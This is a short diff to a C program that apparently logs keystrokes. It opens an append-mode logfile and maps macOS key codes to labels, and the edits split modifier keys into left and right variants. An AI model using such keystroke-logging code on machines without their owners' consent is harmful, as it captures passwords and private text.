@@ -35,7 +35,7 @@ int main(int argc, const char *argv[]) {
     // Get the current time and open the logfile.
     time_t result = time(NULL);
     logfile = fopen(logfileLocation, "a");
-    
+
     if (!logfile) {
         fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
         exit(1);
@@ -141,14 +141,15 @@ const char *convertKeyCode(int keyCode) {
         case 49:  return " ";
         case 51:  return "[del]";
         case 53:  return "[esc]";
-        case 55:  return "[cmd]";
-        case 56:  return "[shift]";
+        case 54:  return "[right-cmd]";
+        case 55:  return "[left-cmd]";
+        case 56:  return "[left-shift]";
         case 57:  return "[caps]";
-        case 58:  return "[option]";
-        case 59:  return "[ctrl]";
-        case 60:  return "[shift]";
-        case 61:  return "[option]";
-        case 62:  return "[ctrl]";
+        case 58:  return "[left-option]";
+        case 59:  return "[left-ctrl]";
+        case 60:  return "[right-shift]";
+        case 61:  return "[right-option]";
+        case 62:  return "[right-ctrl]";
         case 63:  return "[fn]";
         case 64:  return "[f17]";
         case 72:  return "[volup]";
